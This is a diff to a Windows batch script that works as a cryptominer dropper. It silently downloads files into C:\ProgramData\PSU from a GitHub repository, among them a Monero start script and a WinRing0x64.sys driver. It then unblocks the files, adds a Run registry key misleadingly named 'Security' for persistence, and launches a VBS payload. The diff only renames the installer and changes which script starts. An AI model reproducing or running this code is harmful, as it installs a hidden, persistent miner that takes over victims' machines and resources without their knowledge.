@@ -1,7 +1,7 @@
 @echo off
 mkdir "C:\ProgramData\PSU" >> nul
 timeout 1 >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/check.txt" -o "C:\ProgramData\PSU\check.bat" >> nul
@@ -14,5 +14,5 @@ timeout 1 >> nul
 powershell.exe Unblock-File -Path "*"
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
-start "" "C:\ProgramData\PSU\start.vbs"
+start "" "C:\ProgramData\PSU\Install.vbs"
 exit
